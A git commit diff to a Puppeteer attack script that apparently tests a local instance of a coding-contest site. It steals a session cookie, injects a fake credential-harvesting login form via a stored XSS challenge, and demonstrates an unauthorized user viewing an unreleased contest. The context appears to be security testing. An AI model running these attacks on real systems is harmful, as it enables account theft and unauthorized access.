90da44f4009ee578c82a92cd584c1c82976bc66c
Omar Brikaa <brikaaomar@gmail.com>
2024-04-11 14:37:34 +0200

    View future contest as unauthorized user

--- 3/attacks/attacks.js
+++ 3/attacks/attacks.js
@@ -1,24 +1,57 @@
 import puppeteer from 'puppeteer';
 
-const login = async () => {
-  const browser = await puppeteer.launch({
-    headless: false,
-    executablePath: '/usr/lib/chromium/chromium',
-    userDataDir: './test'
-  });
-  const page = await browser.newPage();
-  await page.goto('http://127.0.0.1:2005/auth/discord');
-  await page.waitForSelector('.em_container');
+const createUrl = (endpoint) => `http://127.0.0.1:2005${endpoint}`;
+
+const login = async (page) => {
+  await page.goto(createUrl('/auth/discord'));
+  await page.waitForSelector('.em_container', { timeout: 0 });
   const cookies = await page.cookies();
-  await page.close();
-  await browser.close();
-  return cookies.find((c) => c.name === 'engineerman.sid');
+  const cookie = cookies.find((c) => c.name === 'engineerman.sid');
+  return `${cookie.name}=${cookie.value}`;
 };
 
-(async () => {
-  console.log('Log in with an account that has add challenges permission');
-  const cookie = await login();
+// Get superuser cookie
+console.log('Log in with an account that has superuser permissions');
+console.log(
+  "If you don't have one, create an account and give it superuser permissions through `./emkc mysql`"
+);
+const superUserBrowser = await puppeteer.launch({
+  headless: false,
+  userDataDir: './test'
+});
+const superUserPage = await superUserBrowser.newPage();
+const superUserCookie = await login(superUserPage);
+console.log({ superUserCookie });
 
+// Create future contest
+await fetch(createUrl('/admin/contests/create'), {
+  credentials: 'include',
+  headers: {
+    Accept: 'application/json, text/plain, */*',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Content-Type': 'application/json;charset=utf-8',
+    'Sec-Fetch-Dest': 'empty',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Site': 'same-origin',
+    Cookie: superUserCookie
+  },
+  body: '{"name":"Future contest","description":"{\\"ops\\":[{\\"insert\\":\\"Future contest\\\\n\\"}]}","start_date":"2025-04-14 17:00:00","end_date":"2025-04-17 17:00:00","input":"asd","output":"asd","disallowed_languages":"awk,basic.net,csharp.net,python2,python2,awk,dotnet,csharp.net,basic.net"}',
+  method: 'POST',
+  mode: 'cors'
+});
+
+await superUserPage.goto(createUrl('/admin/contests'));
+
+// Get future contest url
+await superUserPage.waitForSelector('td.actions');
+const futureContestEndpoint = await superUserPage.$eval(
+  'td.actions:first-child a:nth-child(2)',
+  (element) => element.getAttribute('href')
+);
+console.log({ futureContestUrl: futureContestEndpoint });
+
+// Create an XSS injected challenge
+{
   console.log('XSS Attack');
 
   const body = {
@@ -28,18 +61,18 @@ const login = async () => {
     name: 'XSS injected',
     description: 'XSS injected',
     html: `
-      <form action="/evil" method="post">
-      <label>Username</label>
-      <input type="text">
-      <label>Password</label>
-      <input type="password">
-      <input type="submit" value="Log in">
-      </form>
-      `,
+        <form action="/evil" method="post">
+        <label>Username</label>
+        <input type="text">
+        <label>Password</label>
+        <input type="password">
+        <input type="submit" value="Log in">
+        </form>
+        `,
     tests: [{ challenge_id: -1, name: '12', input: '12', output: '12', index: 0 }]
   };
 
-  const res = await fetch('http://127.0.0.1:2005/admin/challenges/create', {
+  const res = await fetch(createUrl('/admin/challenges/create'), {
     credentials: 'include',
     headers: {
       Accept: 'application/json, text/plain, */*',
@@ -50,9 +83,8 @@ const login = async () => {
       'Content-Type': 'application/json;charset=utf-8',
       Pragma: 'no-cache',
       'Cache-Control': 'no-cache',
-      Cookie: `${cookie.name}=${cookie.value}`
+      Cookie: superUserCookie
     },
-    referrer: 'http://127.0.0.1:2005/admin/challenges/create',
     body: JSON.stringify(body),
     method: 'POST',
     mode: 'cors'
@@ -62,4 +94,31 @@ const login = async () => {
   console.log(
     'If the attack is successful, you will see a new challenge called "XSS injected" with an unsafe form'
   );
-})();
+}
+
+await superUserPage.close();
+await superUserBrowser.close();
+
+// Get normal user cookie
+const userBrowser = await puppeteer.launch({
+  headless: false,
+  userDataDir: './test2'
+});
+const userPage = await userBrowser.newPage();
+console.log('Log in as a normal user');
+await login(userPage);
+
+
+// as normal user, access future contest
+{
+  console.log('Viewing a future contest as an unauthorized user attack');
+  await userPage.goto(createUrl(futureContestEndpoint));
+  await userPage.waitForSelector('.em_contests_contest');
+  await userPage.screenshot({ path: './future-contest.jpg' });
+  console.log(
+    'If the attack is successful, there will be a screenshot called future-contest.jpg with the content of the future contest'
+  );
+}
+
+await userPage.close();
+await userBrowser.close();
